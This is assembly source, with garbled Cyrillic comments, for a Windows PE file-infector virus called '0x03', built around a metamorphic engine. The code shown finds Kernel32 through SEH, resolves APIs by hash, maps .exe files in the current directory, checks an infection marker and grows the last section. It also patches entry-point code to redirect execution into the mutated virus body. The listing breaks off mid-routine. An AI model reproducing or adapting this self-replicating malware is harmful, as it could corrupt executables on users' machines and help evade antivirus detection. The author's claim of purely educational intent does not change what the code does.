;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;                                                                                                ;
;                   ########                      ########        ########                       ;
;                  ##########                    ##########      ##########                      ;
;                 ##        ##                  ##        ##              ##                     ;
;                 ##        ##                  ##        ##              ##                     ;
;                 ##        ##    ##      ##    ##        ##              ##                     ;
;                 ##        ##     ##    ##     ##        ##       ########                      ;
;                 ##        ##      ##  ##      ##        ##       ########                      ;
;                 ##        ##       ####       ##        ##              ##                     ;
;                 ##        ##       ####       ##        ##              ##                     ;
;                 ##        ##      ##  ##      ##        ##    ##        ##                     ;
;                  ##########      ##    ##      ##########     ###########                      ;
;                   ########      ##      ##      ########       #########                       ;
;                                                                                                ;
;                                                                                                ;                                                                                  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;											:)                                                   ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;				    					����� 0x03 (�� �� Spectr0)                                               ;
;                                                                                                ;
;				       					   ����:                                                 ;
;                                                                                                ;
;(+) ���⮩ ��⠬��䨭� (� ��� �⠩ � ������ spectr.asm)                                       ;
;(+) ��������� ����⠭���� ������ ����                                                          ;
;(+) ���� ���� Kernel32 (�१ SEH)                                                           ;
;(+) ���� ���ᮢ ���襪 �� ��蠬                                                               ;
;(+) ��䥪� ��-䠩��� (*.exe)                                                                    ;
;(+) �� ��������� �६� ��᫥���� ����䨪�樨 䠩���                                            ;
;(+) �� ���������� ��ਡ��� 䠩���                                                               ;
;(+) �� ���������� ��ਡ��� ᥪ権 � ���⢥                                                      ;
;(+) �������� ����㧪� (�맮� ���ᠣ�:)                                                          ;
;(+) �� ��ॡ������� �窠 �室� (�� �����, �㤠 ��� 㪠�뢠��, ���� SEH)                     ;                      
;                                                                                                ;                                        
;(-) �� ��⨬���஢��                                                                            ;
;(-) ��������� ࠧ��� 䠩��                                                                     ;
;                                                                                                ;
;(x) ��襫 �஢��� �� �� Windows XP SP2, �� ��㣨� �� ��⨫.                                  ;
;                                                                                                ;
;				    					����� 3.5                                               ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;              
;                                                                                                ;
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                                ;
;				     					����������:                                              ;
;                                                                                                ;
;1) ��䥪� 䠩��� �ந�室�� ⮫쪮 � ⥪�饩 �����.                                             ;
;2) ����� ����� ��䥪�� 䠩�� ��⮤�� ���७�� ��᫥���� ᥪ樨.                             ;
;3) ����� ᮧ��� � ��ࠧ���⥫��� 楫�� + ᠬ�ࠧ����.                                         ;
;4) ����� ᮧ��� ��� ������� ��� ࠧ��� ������� (ࠡ��ᯮᮡ����, ��室�� �����,               ;
;   �祩, etc:)                                                                                 ;
;5) ����� ��४ �� ����ᠭ ᯥ樠�쭮 ��� �஢�ન �ࠢ��쭮� ࠡ��ᯮᮡ���� ������         ;
;	SPECTR. �.�. ��� ������ �������� �� �� �������, � ⠪�� ��� �஢�ન ��㣨� ������,        ;
;	����� ��� ����⨬���஢��. ������ ��譨� ������� �뫨 ����ᠭ� ᯥ樠�쭮 ��� �஢�ન      ;
;	������� ������.                                                                              ;
;6) ��� �⮣� ������ ᯥ樠�쭮 ������� ��।���� ����� LiTo.                                   ;
;7) ���� ����, ������ ��⥫쭥�.                                                            ; 
;                                                                                                ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
                             


																			;m1x
																	 ;pr0mix@mail.ru	





.386
.model flat, stdcall
option casemap:none

include windows.inc;\masm32\include\windows.inc
include kernel32.inc;\masm32\include\kernel32.inc

includelib kernel32.lib;\masm32\lib\kernel32.lib


.code
;------------------------------------------------------------------------------------------------
AddrIsklComand:											;�����窠 �᪫�祭�� (��)
	dd		HashTable1        -start                    ;��� �����, ����� �ᯮ������� �� ����, 
	dd		SizeHashTable1                              ;� ᬥ饭�� �⭮�⥫쭮 �窨 �室� � �ண�
	dd		_isklvir1_		  -start                    ;���祭�� ������ ��� � ���浪� �����⠭��
	dd		Sizeisklvir1
	dd		szVNA             -start
	dd		SizeszVNA
	dd		_isklvir2_		  -start
	dd		Sizeisklvir2
	dd		_iskl1_           -start
	dd		Sizeiskl1
	dd		_iskl2_           -start
	dd		Sizeiskl2
	dd		_iskl8_           -start
	dd		Sizeiskl8
	dd		Buf2              -start
	dd		SizeBuf2
	dd		RANG32            -start
	dd		SizeRANG32
	dd		pfx				  -start
	dd		SizePfx
	dd		TableFlags1		  -start
	dd		SizeTbl
	dd		_isklspectr0_	  -start
	dd		Sizeiskspectr0
	dd		_isklspectr1_	  -start
	dd		Sizeiskspectr1
	dd		_isklspectr2_	  -start
	dd		Sizeiskspectr2
	dd		_isklspectr3_	  -start
	dd		Sizeiskspectr3
	dd		_isklspectr4_	  -start
	dd		Sizeiskspectr4
	dd		_iskl9_           -start
	dd		Sizeiskl9
	dd		_iskl10_           -start
	dd		Sizeiskl10
	dd		_iskl11_           -start
	dd		Sizeiskl11	
	dd		_isklvir3_		  -start
	dd		Sizeisklvir3
	dd		_isklvir4_		  -start
	dd		Sizeisklvir4
	dd		_iskl3_           -start
	dd		Sizeiskl3	
	dd		_isklvir5_		  -start
	dd		Sizeisklvir5
	dd		_isklvir6_		  -start
	dd		Sizeisklvir6
	dd		_isklvir7_		  -start
	dd		Sizeisklvir7
	dd		_isklvir8_		  -start
	dd		Sizeisklvir8
	dd		szUser32          -start
	dd		SizeszUser32
	dd		_iskl4_           -start
	dd		Sizeiskl4
	dd		szMessageBoxA     -start
	dd		SizeszMessageBoxA
	dd		_iskl5_           -start
	dd		Sizeiskl5
	dd		_iskl6_           -start
	dd		Sizeiskl6
	dd		_iskl7_           -start
	dd		Sizeiskl7
	dd		_isklvir9_		  -start
	dd		Sizeisklvir9

	;dd		_isklvir10_		  -start
	;dd		Sizeisklvir10																				

	dw		0ffffh										;����� ��
SizeAddrIsklComand	equ		$-AddrIsklComand            ;ࠧ��� ��
;------------------------------------------------------------------------------------------------


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;x                                                                                  ###         x
;x                                                                                 #####        x
;x            ######     ####     ######    #    #     ###      ###     #   #      #####        x
;x            #    #    #    #    #          #  #     #   #    #   #    #  ##      #####        x
;x            #    #    #    #    #####       ##      #####    #   #    # # #       ###         x
;x            #    #    #    #    #          #  #     #   #    #   #    ##  #                   x
;x            #    #     ####     ######    #    #    #   #   #    #    #   #       ###         x
;x                                                                                  ###         x
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

start:
	assume	fs:flat
	call	_START_										;���室��
	;CallFunc	eax,ecx,edx,'8'                         ;��⠢�� ⠪�� call (��� ࠧ����ࠧ��:)!

;================================================================================================			                           
;�ᯮ����⥫�� ��६����
;================================================================================================

;================================================================================================

;------------------------------------------------------------------------------------------------

pushz	macro szText:VARARG             				;����� ��� ᮧ����� ��ப�
	local	l1                                          ;� ����祭�� � �⥪� �� ����
	call	l1                                          ;� ��饬, ��� �ᥣ�� - �� ᬮ�ਬ � ��室��� + �⫠�稪:)!
	db		szText,0                                    ;� �⮬ ���쪥 �� �ᯮ������
l1:
endm
;------------------------------------------------------------------------------------------------

CallFunc	macro reg1,reg2,tmp1,tmp2                   ;���� (� �맮�) �㭪権 �� ��થࠬ
	local	_metka1_
	mov		reg1,tmp1
	push	reg2
	mov		reg2,'iriu'
	inc		reg2
_metka1_:
	inc		reg1
	cmp		reg2,dword ptr [reg1]
	jne		_metka1_
	cmp		byte ptr [reg1+4],tmp2;'5'
	jne		_metka1_
	pop		reg2
	add		reg1,5
	call	reg1
endm

;------------------------------------------------------------------------------------------------
InitData:                                               ;���樠����஢���� �����	
	dwEntry					equ	dword ptr [ebp+4*1]     ;����� �㤥� �࠭����� ���� ᠬ�� ��ࢮ� ������� (��� �窠 �室�)
	delta					equ	dword ptr [ebp]         ;夥�� �࠭���� �����-ᬥ饭��
														;� �⮬ ���쪥 ��� ���� �� ������⢮����
;------------------------------------------------------------------------------------------------
Func1:                                                  ;����� ���� �࠭����� ���� �㦭�� ���襪
	_fCreateFileA			equ	dword ptr [ebp-4*4]     ;ᬮ�� �� ��������:)
	_fCreateFileMappingA	equ	dword ptr [ebp-4*5]
	_fMapViewOfFile   		equ	dword ptr [ebp-4*6]
	_fUnmapViewOfFile  		equ	dword ptr [ebp-4*7]
	_fCloseHandle     		equ	dword ptr [ebp-4*8]
	_fFindFirstFileA   		equ	dword ptr [ebp-4*9]
	_fFindNextFileA      	equ	dword ptr [ebp-4*10]
	_fSetFileAttributesA  	equ	dword ptr [ebp-4*11]
	_fGetCurrentDirectoryA	equ	dword ptr [ebp-4*12]
	_fLoadLibraryA       	equ	dword ptr [ebp-4*13]
	_fGetProcAddress     	equ	dword ptr [ebp-4*14]
	_fSetFileTime     		equ	dword ptr [ebp-4*15]
	_fVirtualProtect		equ	dword ptr [ebp-4*16]
	_fSetFilePointer		equ dword ptr [ebp-4*17]
	_fSetEndOfFile			equ dword ptr [ebp-4*18]
	_fVirtualAlloc			equ dword ptr [ebp-4*19]
	_fVirtualFree			equ dword ptr [ebp-4*20]
	
	_fMessageBoxA			equ	dword ptr [ebp-4*21]
;------------------------------------------------------------------------------------------------
	                                                 	;22 - hFindFile
	                                                 	;24 - ret address
	                                                 	;23 - OEP	                                                 	
	                                                 	;25 - eax	                                                 	
	                                                 	;26 - esi
;------------------------------------------------------------------------------------------------
    szPath					equ	dword ptr [ebp-4*27]    ;���� � ���⢥:)!
	pExe					equ	dword ptr [ebp-4*28]    ;mapped address
	EntryPoint				equ	dword ptr [ebp-4*29]    ;AddressOfEntryPoint
	pEntryPoint				equ	dword ptr [ebp-4*30]    ;address AddressOfEntryPoint
	pSizeOfImage			equ	dword ptr [ebp-4*31]    ;���� SizeOfImage
	Base					equ	dword ptr [ebp-4*32]    ;ImageBase
	FA						equ	dword ptr [ebp-4*33]    ;FileAlignment
	pRSizeOfLastSec			equ	dword ptr [ebp-4*34]    ;address SizeOfRawData LastSection (LS) 
	pVSizeOfLastSec			equ	dword ptr [ebp-4*35]    ;address VirtualSize LS
	pCharacters				equ	dword ptr [ebp-4*36]    ;address Characteristics LS
	RSizeOfLastSec			equ	dword ptr [ebp-4*37]    ;SizeOfRawData LS
	VSizeOfLastSec			equ	dword ptr [ebp-4*38]    ;VirtualSize LS
	VirtAddr				equ dword ptr [ebp-4*39]    ;VirtualAddress LS
	CorVirSize              equ dword ptr [ebp-4*40]	;��࠭塞 ࠧ��� ����祭����  ����஢������ ����
	AddrShifrCode           equ dword ptr [ebp-4*41]    ;��࠭塞 ���� ����祭����  ����஢������ ����
	tmpAddrTblIskl			equ	dword ptr [ebp-4*42]    ;�ᯮ����⥫쭠� ��६����� ��� �࠭���� ���� �� � ��㣮� ���� (ᬮ�� ��室���)
		
	wfdChgFileSize			equ dword ptr [ebp+4*2+20h]	;wfd.nFileSizeLow

;�===============================================================================================

;+-----------------------------------------------------------------------------------------------

HashTable1:												; ������ �襩 Kernel32
	dd	0860b38bch          							;CreateFileA
	dd	01F394C74h										;CreateFileMappingA
	dd	0FC6FB9EAh       								;MapViewOfFile
	dd	0CA036058h       								;UnmapViewOfFile
	dd	0F867A91Eh       								;CloseHandle
	dd	03165E506h       								;FindFirstFileA
	dd	0CA920AD8h       								;FindNextFileA
	dd	0152DC5D4h    									;SetFileAttributesA
	dd	02F597DD6h       								;GetCurrentDirectoryA
	dd	071E40722h       								;LoadLibraryA
	dd	05D7574B6h 										;GetProcAddress
	dd	0a2d2cb0ch										;SetFileTime
	dd	015f8ef80h										;VirtualProtect
	dd  07f3545c6h										;SetFilePointer
	dd  0059c5e24h										;SetEndOfFile
	dd  019bc06c0h										;VirtualAlloc
	dd	0ea43a878h										;VirtualFree
	
	dw	0ffffh                                          ;����� ⠡��窨 �襩:)
;------------------------------------------------------------------------------------------------

BytesForSEH			db		20 dup (00h)  

ChgVirSize			dd		VirusSize
;------------------------------------------------------------------------------------------------
Bat:                                                    ;Block Address Table (�ᯮ����⥫쭠� �����窠 ���ᮢ ������:)!
	dd	Play
	dd	InfectFiles
	dd	rep_movsb
	dd	fnOpenFile
	dd	ValidPE
	dd	GetKernelSEH
	dd	GetGetProcAddress
	dd	_START_
	dd	_isklvir9_
	;dd	_isklvir10_
	dw	0ffffh
SizeBat				equ		$-Bat

;------------------------------------------------------------------------------------------------

OldBytes			db 		5 dup(00h)					;���� ��� �࠭���� 5 ���� � ࠩ��� �窨 �室� �����
dwOEP				dd 		00h                         ;OEP �����:)!

;------------------------------------------------------------------------------------------------
SizeHashTable1		equ		$-HashTable1				;ࠧ��� ⠡��窨 ��襩





_isklvir1_:                                             ;�ᯮ����⥫�� ��થ�� - � �� ������� �� �㤥� �᪠�� ���� ���� �㭪権
db	'viri','1'
Sizeisklvir1	equ		$ - _isklvir1_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� Play
;�맮� ���ᠣ� ����:)!
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Play:
	pushad
	push	0
	call	_addrszVNA_
szVNA			db '0x03 by m1x! Privet! Ya prisol s mirom!',0 ;Virus Name & Autor
SizeszVNA		equ		$-szVNA

_addrszVNA_:	
	push	dword ptr [esp]
	push	0
	call	_fMessageBoxA                             	;� ᢥ⨬ ���ᠣ�:)!
	popad
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪樨 Play
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





_isklvir2_:
db	'viri','2'
Sizeisklvir2	equ		$ - _isklvir2_	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪�� InfectFiles
;��䥪� exe-襪 (��-䠩�����) ��⮤�� ���७�� ��᫥���� ᥪ樨
;�室:
;edi - ���� � ���⢥ (�ਬ��: "C:\Games\Sacrifice.exe")
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
InfectFiles:
	push	eax                                         ;���࠭塞 ॣ�����
	push	esi

	pushad
	push	FILE_ATTRIBUTE_NORMAL
	push	edi
	call	_fSetFileAttributesA						;�⠢�� ⠪�� ��ਡ���, �⮡� ����� �뫮 ������ + ��� write
	popad
	push	edi;szPath                                  ;��࠭塞 ����                                
;------------------------------------------------------------------------------------------------

	CallFunc	eax,ecx,dwEntry,'4' 					;��室�� � ��뢠�� ���� �㭪�� fnOpenFile (���뢠�� �����)
	
	inc		eax
	je		_error2_
	dec		eax
;------------------------------------------------------------------------------------------------
	mov		edi,wfdChgFileSize							;wfd.nFileSizeLow

	
	;mov		edx,dwEntry
	;add		edx,5+SizeHashTable1-4-5-SizeBat-4
	;mov		edx,dword ptr [edx]	

	mov		edx,VirusSize                           ;new_size=ALIGN_UP(OldSize+VirusSize,FileAlignment)
	mov		ecx,1000h                                   ;#define ALIGN_UP (x,y) ((x+(y-1))&(~(y-1)))
	dec		ecx                                         ;������ FileAlignment=1000h
	add		edx,ecx                                     ;⠪ ��� �� �� �� ����� FileAlignment, 
	not		ecx                                         ;���⮬� �뤥�塞 ࠧ��� � ����ᮬ:)!
	and		edx,ecx
	add		edi,edx
;------------------------------------------------------------------------------------------------
	xchg	eax,esi
	
	push	eax
	pushad
	push	ebx
	push	edi
	push	ebx
	push	PAGE_READWRITE
	push	ebx
	push	esi
	call	_fCreateFileMappingA     					;ᮧ���� �஥��� 䠩��
_iskl1_:                                                ;��।��� �᪫�祭�� ��� ��襣� ������:)!
	mov		dword ptr [esp+20h],eax
Sizeiskl1	equ		$ - _iskl1_
	popad
	pop		eax
	
	test	eax,eax
	jne		_map_
;------------------------------------------------------------------------------------------------
	pushad
	push	esi
	call	_fCloseHandle             					;�᫨ ����, ����뢠�� ���
	popad
	jmp		_error2_
;------------------------------------------------------------------------------------------------
_map_:
	xchg	eax,edi
	
	push	eax
	pushad
	push	ebx
	push	ebx
	push	ebx
	push	FILE_MAP_ALL_ACCESS
	push	edi
	call	_fMapViewOfFile  							;���
_iskl2_:
	mov		dword ptr [esp+20h],eax                     ;�� ���� �᪫�祭��
Sizeiskl2	equ		$ - _iskl2_
	popad
	pop		eax
	
	xchg	edi,eax
;------------------------------------------------------------------------------------------------
	pushad
	push	esi
	push	eax
	call	_fCloseHandle                             	;����뢠�� 㦥 ���㦭� ����
	call	_fCloseHandle
	popad
	test	edi,edi
	je		_error2_
;------------------------------------------------------------------------------------------------
	xchg	eax,edi
	push	eax;pExe                                    ;��࠭塞 ���� ������                           	

	CallFunc	edx,ecx,dwEntry,'5'	 					;call	ValidPE
	                                                    ;�����, �� ��-䠩�?
	test	edx,edx
	je		_error_
	cmp		word ptr [eax+34h],'sr'                     ;��ࠦ�� �� �� 㦥 ��訬 ����쪮�?
	je		_error_
;�������������������������������BEG ࠧ��� �����������������������������������������xxxxxxxxxxxxx
	xchg	esi,eax
	assume	esi:ptr IMAGE_DOS_HEADER
	add		esi,[esi].e_lfanew
	add		esi,4
	;lodsd
	assume	esi:ptr IMAGE_FILE_HEADER
	movzx	ecx,[esi].NumberOfSections
	test	ecx,ecx                      				;���� �� ����� ᥪ樨?
	je		_error_
	add		esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER
	push	[esi].AddressOfEntryPoint      				;����砥� ��� �室�
	;EntryPoint
	lea		eax,[esi].AddressOfEntryPoint               ;����砥� ���� �窨 �室�
	push	eax;pEntryPoint                             ;etc
	lea		eax,[esi].SizeOfImage
	push	eax;pSizeOfImage
	push	[esi].ImageBase
	;Base
	push	[esi].FileAlignment
	;FA
	add		esi,sizeof IMAGE_OPTIONAL_HEADER
	assume	esi:ptr IMAGE_SECTION_HEADER
	xor		edx,edx
	sub		esp,4*5                                     ;�뤥�塞 �� ���� � ��� ��� �६����� ��६�����
;�����������������������BEG ࠧ��� IMAGE_SECTION_HEADER�����x�����������������������xxxxxxxxxxxxx
_cycle_:                                                ;� edx - PointerToRawData
                                                        ;� ebx - VirusAddress
                                                        ;� ecx - ���-�� ᥪ権 � ���⢥
	cmp		edx,[esi].PointerToRawData 					;��室�� ��᫥���� ᥪ�� ����㠫쭮 � 䨧��᪨
	jg		_nc_                                        ;� ⠪�� ᮡ�ࠥ� �㦭�� ����
	cmp		ebx,[esi].VirtualAddress
	jg		_nc_
	lea		eax,[esi].SizeOfRawData
	mov		[esp+4*4],eax
	;mov		[pRSizeOfLastSec+ebp],eax ;!!!!!!!!!!!!!!!
	lea		eax,[esi].Misc.VirtualSize
	mov		[esp+4*3],eax
	;mov		[pVSizeOfLastSec+ebp],eax ;!!!!!!!!!!!!!!!
	lea		eax,[esi].Characteristics
	mov		[esp+4*2],eax
	;mov		[pCharacters+ebp],eax   ;!!!!!!!!!!!!!!!
	mov		edx,[esi].PointerToRawData
	mov		ebx,[esi].VirtualAddress
	mov		eax,[esi].SizeOfRawData
	mov		[esp+4*1],eax
	mov		eax,[esi].Misc.VirtualSize
	mov		[esp],eax
;------------------------------------------------------------------------------------------------
                                                        ;����� ��� �㦭� ��।�����, � ����� ᥪ樨 �ᯮ������ �窠 �室�, 
	mov		eax,EntryPoint                              ;� ⠪�� ������� 䨧��᪨� ���� ᠬ�� ��ࢮ� �믮��塞�� ������樨 � ���⢥
	cmp		eax,ebx
	jb		_nc_
	mov		edi,ebx
	add		edi,[esi].Misc.VirtualSize
	cmp		eax,edi
	ja		_nc_
	sub		eax,ebx                                     ;�᫨ ��諨, � ��⠥� �㦭� ����:)!
	add		eax,edx
	add		eax,pExe
	xchg	eax,edi

_nc_:
	add		esi,sizeof IMAGE_SECTION_HEADER
	dec		ecx
	jne		_cycle_
;�����������������������END ࠧ��� IMAGE_SECTION_HEADER�����x�����������������������xxxxxxxxxxxxx
;�������������������������������END ࠧ��� �����������������������������������������xxxxxxxxxxxxx
	push	ebx                                         ;��࠭塞 VirtualAddress
	sub		esp,12                                      ;�뤥�塞 �� ���� ��� �६����� ��६�����

	mov		eax,RSizeOfLastSec                          ;eax - SizeOfRawData
	test	eax,eax                                     ;�᫨ 䨧��᪨� ࠧ��� ��᫥���� ᥪ樨=0, � �����:(
	je		_error_

	cmp		eax,VSizeOfLastSec 							;��⥬ ᬮ�ਬ, ᮤ�ন� �� ��᫥���� ᥪ�� ����-� ����� 
	jl		_error_

	;mov	eax,pCharacters;                            ;eax - Characteristics address
	;test 	byte ptr [eax+3],IMAGE_SCN_CNT_UNINITIALIZED_DATA;墮�� ᥪ樨 ᮤ�ন� �����, ����. ��ﬨ
	;jnz 	_error_
;------------------------------------------------------------------------------------------------

;------------------------------------------------------------------------------------------------
    pushad                                              ;⠪ �� ��࠭塞 �� ॣ����� ��। ����� �맮��� ���襪

	push	eax
	pushad	
	push	PAGE_READWRITE
	push	MEM_RESERVE + MEM_COMMIT
	push	SizeSPECTRCode
	push	0
	call	_fVirtualAlloc								;�뤥�塞 ������ ��� �࠭���� ����஢������ ���� (� ����ᮬ)
_iskl8_:
	mov		dword ptr [esp+20h],eax                     ;��।��� ���� - �᪫�祭��

Sizeiskl8	equ		$ - _iskl8_
	popad
	pop		eax

	mov		tmpAddrTblIskl,eax                          ;��࠭�� ���� ��� ��

;------------------------------------------------------------------------------------------------

	push	edi                                         
	xchg	eax,edi   	   	
   	mov		esi,dwEntry      
	add		esi,5+SizeHashTable1-4-5-SizeBat-4-20     
	push	20
	pop		ecx
	push	esi                      
	push	ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
	                                                    ;��� ��砫� ��࠭�� ����� (5 ����) ��� ����⠭������� ���� 	                                
	pop		ecx
	pop		esi                      
	pop		edi
;------------------------------------------------------------------------------------------------
	push	edi
	push	ecx
	xchg	edi,esi

	CallFunc	eax,ecx,dwEntry,'3'  					;call	rep_movsb	 
	                                                    ;⥯��� ����襬 ���� 5 ���� ����� (�, �� � ࠩ��� �窨 �室�) � ����
	pop		ecx
	pop		edi
;------------------------------------------------------------------------------------------------
	call	_addrSEH_
_SEH_:
	xor		eax,eax
	push	12345678h
	push	dword ptr fs:[eax]
	mov		dword ptr fs:[eax],esp
	div		eax
SizeSEH		equ		$ - _SEH_		
_addrSEH_:	
	pop		ebx
	mov		eax,VirtAddr                                ;�����, ����襬 ����� ��� 5 ���� jmp �� ��� ���騩 ���:)!
	add		eax,RSizeOfLastSec                          ;��� �⮣� ����⠥� ���࠭� ������: ��㫠 ⠪��:
	add		eax,SizeAddrIsklComand;-5                    ;x-y-5=operand
	add		eax,Base
	mov		dword ptr [ebx+3],eax
	mov		ecx,20;SizeSEH
_rmb0_:
	mov		al,byte ptr [ebx]
	mov		byte ptr [edi],al
	inc		edi
	inc		ebx
	dec		ecx
	jne		_rmb0_

	
	;sub		eax,EntryPoint                              ;x - ����, �㤠 ���� ��룭���; y - ����, ��� ��室���� ��� ᠬ� jmp
	                                   					;5 - ���� ���� ��� ����� (near jmp)
	;mov		byte ptr [edi],0E9h                         ;����襬 ����� ������
	;mov		dword ptr [edi+1],eax		                ;� 㦥 �ࠢ��쭮 ����⠭�� ���࠭� ������
	
	mov		edi,tmpAddrTblIskl                          ;⥯��� �ਡ���� +5 (⠪ ��� �� ��࠭��� ⠬ 5 ���� �����)
	add		edi,20

	mov		edx,edi
;------------------------------------------------------------------------------------------------
	mov		eax,EntryPoint                      		;��࠭�� OEP �����
	add		eax,Base
	mov		ebx,dword ptr [ebp-4*25]
	mov		dword ptr [ebx],eax
;------------------------------------------------------------------------------------------------
	mov		esi,dwEntry                                 ;⥯��� ᪮���㥬 �� � �뤥����� ����
	mov		ecx,SizeAddrIsklComand
	sub		esi,ecx

	CallFunc	eax,ecx,dwEntry,'3'	 					;call	rep_movsb
;------------------------------------------------------------------------------------------------
	push	eax                                         ;
	push	eax
	pushad                                              ;��࠭塞 �� ॣ����� ��। �맮��� �㭪樨
	push	edx                                         ;������ � ��� ���� ��         
	call	@F                                          ;� ���� ���� ��� �����       
;-----------------------------------------------------------------------------------------
Buf2		db 100h dup (00h)                           ;���� ��� ࠧ��࠭��� ����ᬮ�  ;    
SizeBuf2	equ		$ - Buf2                            ;�������                         ;
;-----------------------------------------------------------------------------------------
@@:
	push	edi                                         ;� ���� ���� ��� ����஢���� ���
	push	dwEntry	                                    ;� ���� ����, ����� ���� �஬�����

	;mov		edx,dwEntry
	;add		edx,5+SizeHashTable1-4-5-SizeBat-4	
	;push	dword ptr [edx]

	push	VirusSize                                   ;� ࠧ��� ���쪠 ( � ����ᮬ - �.�. �� ��᫥ ���䨭�� 㢥������)
	call	@F                                          ;� ���� ���
;-----------------------------------------------------------------------------------------
include		rang32.asm                                  ;���                             ;          
;-----------------------------------------------------------------------------------------	
@@:
	call	_gospectr_	                                ;� ���� ����ᬠ
;-----------------------------------------------------------------------------------------
include		_lito_.asm                                  ;������������                    ;
;-----------------------------------------------------------------------------------------
include		spectr.asm                                  ;SIMPLE MORHPER                  ;
;-----------------------------------------------------------------------------------------
	
_gospectr_:	
	call	SPECTR										;�� ���, �������-��, �������� ��� ������� ������!
;------------------------------------------------------------------------------------------------
_iskl9_:
	sub		edi,SizeAddrIsklComand                      ;᪮�४��㥬 ����
	add		eax,SizeAddrIsklComand                      ;� ࠧ���
	mov		dword ptr [esp+20h],eax
	mov		dword ptr [esp+24h],edi
Sizeiskl9	equ		$ - _iskl9_
	popad
	pop		eax
	pop		edi
	mov		CorVirSize,eax                				;��࠭塞 ࠧ��� ����祭���� ����஢������ ����
	mov		AddrShifrCode,edi                         	;��࠭塞 ���� ����祭���� ����஢������ ����
	
	mov		edx,dwEntry
	add		edx,5+SizeHashTable1-4-5-SizeBat-4
	mov		dword ptr [edx],eax	


;------------------------------------------------------------------------------------------------

;xxxxxxxxxxxxxxxxxxxxxxxxxxxBEG ������������ ������xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

                                                        ;⥯���, ����⠢�� ����� � ����஢����� ����
	                                                    ;�� ����� �뫮 ᤥ���� � ��� ⠪��� �����, �� � ��⠢�� ⠪, ��� ����:)!
	
;------------------------------------------------------------------------------------------------
	lea		eax,[edi+eax]                               ;��� ��砫� ������ � �⮬ ���� ���� ������ (�㭪権), ����� �㤥� ����⠢����
	mov		ebx,'iriu'                                  ;�᪠�� �㤥� �� ��訬 ��થࠬ
	inc		ebx
	xor		ecx,ecx
	lea		esi,dword ptr [edi+SizeAddrIsklComand+5+SizeHashTable1-4-5-SizeBat]
	push	edi
_nxtmarker_:
	cmp		ebx,dword ptr [edi]                         ;������ �� ��થ�?
	jne		@F
	mov		dword ptr [esi+ecx*4],edi                   ;�᫨ ��, � ��࠭�� �� �६����� ���� ��� ���� (� ���� ���� ��।���� �����)
	inc		ecx
@@:
	inc		edi
	cmp		edi,eax                                     ;� ⠪ �� ���� ����
	jb		_nxtmarker_
	pop		edi		
	xor		ecx,ecx

;------------------------------------------------------------------------------------------------
_nxtrndnum_:	                                        ;�����, ��६�蠥� �������� ���� � ��砩��� ���浪�
	push	eax
	pushad

_iskl10_:	
	push	(SizeBat-2)/4-1								;�⭨���� -1 ��⮬�, �� ��᫥���� ���� �� �����뢠�� �� �㤥�! (�.�. ⠬ ����:)!
	pop		eax
Sizeiskl10	equ		$ - _iskl10_
	
	call	RANG32                                      ;���
_iskl11_:
	mov		dword ptr [esp+20h],eax                     ;�� ���� �᪫�祭��
Sizeiskl11	equ		$ - _iskl11_
	popad
	pop		eax
	
	mov		edx,dword ptr [esi+eax*4]
	push	dword ptr [esi+ecx*4]
	pop		dword ptr [esi+eax*4]
	mov		dword ptr [esi+ecx*4],edx
	inc		ecx
	cmp		ecx,(SizeBat-2)/4-1
	jne		_nxtrndnum_
;------------------------------------------------------------------------------------------------

	mov		edx,edi                                     ;�����, ᭠砫� ����襬 (�� ����⠢���) �� + 5 ���� (call) + ⠡���� ��襩
	add		edx,CorVirSize
